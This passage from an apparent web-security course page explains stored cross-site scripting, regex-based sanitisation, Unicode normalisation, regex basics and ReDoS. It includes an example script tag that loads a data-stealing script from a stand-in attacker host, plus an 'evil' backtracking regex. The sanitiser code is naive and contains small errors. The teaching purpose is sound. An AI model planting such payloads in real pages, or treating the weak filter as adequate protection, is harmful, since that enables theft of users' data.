<div class="language-html highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span> the message is <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;http://hacker-network.io/stealuserinfo.js&#39;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;javascript&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></code></pre></div>
<p>when it is executed on the victim's browser, the hacker's script will be executed and extract the information from the victim's machine. </p>
<p>One way to address this issue is to santize the record retrieved from the database</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dbmodel</span><span class="p">.</span><span class="nx">getOne</span><span class="p">();</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">regex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/&lt;.*&gt;/g</span><span class="p">;</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="o">:</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">regex</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">        </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;div&gt; the message contains some illegal characters &lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">        </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`&lt;div&gt; the message is &lt;/div&gt; &lt;div&gt; </span><span class="si">${</span><span class="nx">msg</span><span class="si">}</span><span class="sb"> &lt;/div&gt;`</span><span class="p">;</span>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="p">})</span>
</span></code></pre></div>
<p>However this might not cover all edge cases. Suppose the malicious user use the unicode representation of the <code>&lt;</code> and <code>&gt;</code>, namely and <code>\uFE64</code> and <code>\uFE65</code>.</p>
<p>This motivates the need of normalizing the unicode representations into the ascii representation before sanization.</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dbmodel</span><span class="p">.</span><span class="nx">getOne</span><span class="p">();</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">regex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/&lt;.*&gt;/g</span><span class="p">;</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="o">:</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">normalize</span><span class="p">(</span><span class="s1">&#39;NFKC&#39;</span><span class="p">).</span><span class="nx">match</span><span class="p">(</span><span class="nx">regex</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">        </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;div&gt; the message contains some illegal characters &lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">        </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`&lt;div&gt; the message is &lt;/div&gt; &lt;div&gt; </span><span class="si">${</span><span class="nx">msg</span><span class="si">}</span><span class="sb"> &lt;/div&gt;`</span><span class="p">;</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="p">})</span>
</span></code></pre></div>
<h3 id="using-regex-to-sanitze-input">Using Regex to sanitze input</h3>
<p>Regular expression (Regex) is a commonly use domain specific language for string and data matching. It has a compact syntax and light-weightish implementation. Most of the languages come with libraries support of regex. For instance, in JavaScript, we use the following statement to define a regex object. </p>
<p><div class="language-js highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">re</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/ab+c/</span>
</span></code></pre></div>
or
<div class="language-js highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">re</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">RegExp</span><span class="p">(</span><span class="s2">&quot;ab+c&quot;</span><span class="p">)</span>
</span></code></pre></div></p>
<p>Then we can run it using </p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">abbbbc</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">re</span><span class="p">));</span>
</span></code></pre></div>
<p>Here are some basic examples of constructing regex pattern. </p>
<h4 id="matching-a-single-expression">Matching a single expression</h4>
<div class="language-js highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a/</span><span class="p">;</span><span class="w">  </span><span class="c1">// match one</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="s2">&quot;aaa&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">r1</span><span class="p">);</span><span class="w"> </span><span class="c1">// [ &#39;a&#39;, index: 0, input: &#39;aaa&#39;, groups: undefined ]</span>
</span></code></pre></div>
<p>In the above code snippet, <code>r1</code> is a regex that matches a character <code>a</code>.  In the second line, we match the input string <code>aaa</code> with the pattern. The result contains 
the part that the regex matches, which is <code>'a'</code>, its index and the input and the groups if available.  Note that it only searches for the pattern once in the input string. </p>
<h4 id="matching-a-single-expression-globally">Matching a single expression globally</h4>
<p>If we want to apply the regex to look matches "globally" over the input, we define</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a/g</span><span class="p">;</span><span class="w"> </span><span class="c1">// match everywhere</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="s2">&quot;aaa&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">r2</span><span class="p">);</span><span class="w"> </span><span class="c1">// [ &#39;a&#39;, &#39;a&#39;, &#39;a&#39; ]</span>
</span></code></pre></div>
<h4 id="case-insensitivity">Case insensitivity</h4>
<p>If we would like to ignore case sensitivity during the match, we add <code>i</code> to the flags field.</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a/ig</span><span class="p">;</span><span class="w"> </span><span class="c1">// match everywhere case insensitively </span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="s2">&quot;aAa&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">r3</span><span class="p">);</span><span class="w"> </span><span class="c1">// [ &#39;a&#39;, &#39;A&#39;, &#39;a&#39; ]</span>
</span></code></pre></div>
<h4 id="anchored-match">Anchored match</h4>
<p>Sometimes we would like to regex to match with the exact starting and ending of the input. </p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/^a$/</span><span class="p">;</span><span class="w"> </span><span class="c1">// match exact from the start to the end;</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="s2">&quot;aaa&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">r4</span><span class="p">);</span><span class="w">  </span><span class="c1">// null</span>
</span></code></pre></div>
<p>In the above <code>^</code> denotes the starting of the input and <code>$</code> denotes the ending. </p>
<h4 id="character-class-match">Character class match</h4>
<p>If we want to match a set of alterantive characters, we use </p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/[ab]/g</span><span class="p">;</span><span class="w"> </span><span class="c1">// match everywhere with character group, a or b </span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="s2">&quot;abb&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">r5</span><span class="p">);</span><span class="w">  </span><span class="c1">// [ &#39;a&#39;, &#39;b&#39;, &#39;b&#39; ]</span>
</span></code></pre></div>
<p>Note that if we use a <code>^</code> in a <code>[]</code> it means not, e.g. <code>/[^ab]/</code> means match any character except for <code>a</code> and <code>b</code>. </p>
<h4 id="kleenes-star">Kleene's star</h4>
<p>Klenee's star allows us to repeat a sub-regex pattern many times. (Note this is different from the global flag <code>g</code>, which produces a list of matches).
<div class="language-js highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a*/</span><span class="w"> </span><span class="c1">// repetition, zero or more</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="s2">&quot;aaa&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">r6</span><span class="p">);</span><span class="w">  </span><span class="c1">// [ &#39;aaa&#39;, index: 0, input: &#39;aaa&#39;, groups: undefined ]</span>
</span></code></pre></div></p>
<h4 id="reference-group">Reference group</h4>
<p>Sometimes, we would like to match and extract parts of the input. We use paranthesis to annotate the sub part that we would like to extract.</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a(a*)/</span><span class="w"> </span><span class="c1">// match and extract into groups </span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="s2">&quot;aaa&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">r7</span><span class="p">);</span><span class="w">  </span><span class="c1">// [ &#39;aaa&#39;, &#39;aa&#39;, index: 0, input: &#39;aaa&#39;, groups: undefined ]</span>
</span></code></pre></div>
<p>In the above, we match then extract the rest of <code>a</code> after the first <code>a</code>. </p>
<p>Note that we can add referenced kleene's star regex with a global flag. The following will produce an initialization error.</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/(a*)/g</span><span class="w"> </span><span class="c1">// error, won&#39;t allow</span>
</span></code></pre></div>
<h4 id="more-on-repetition">More on repetition</h4>
<p>Besides kleene's star, we have the following different operators that define different constraint of repetition.</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a+/</span><span class="w"> </span><span class="c1">// repetition, one or more</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a{2,}/</span><span class="w"> </span><span class="c1">// repetition, two or more</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a{2,3}/</span><span class="w"> </span><span class="c1">// repetition, two or three</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="kd">const</span><span class="w"> </span><span class="nx">r12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/a{3}/</span><span class="w"> </span><span class="c1">// repetition, exactly three</span>
</span></code></pre></div>
<h4 id="pitfall-of-using-regex-as-input-sanitzer">Pitfall of using Regex as input sanitzer</h4>
<p>There many different algorithm in implementing regex matching. Unfortunately many existing libraries use a back-tracking approach when performing the regex matching. This leads to a possible security threat to the software system. e.g. </p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">evil</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/^(a*)*h$/</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="s2">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">p</span><span class="p">);</span>
</span></code></pre></div>
<p>The above takes a substantial amount of time to converge, because the nested kleene's star of <code>(a*)*</code>. The backtracking algorithm tries to back-track and searches for alternative to satisfy the match with the ending <code>h</code> character though there are exponentially many paths to back-track. </p>
<p>In general, when a nested repeatable regex accept an empty input, it is problematic, it is classified as <em>evil</em> regular expression. </p>
<p>For more details, refer to </p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
</span></code></pre></div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy"], "search": "../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.d7c377c4.min.js"></script>
      
        <script src="../../javascripts/mathjax.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  </body>
</html>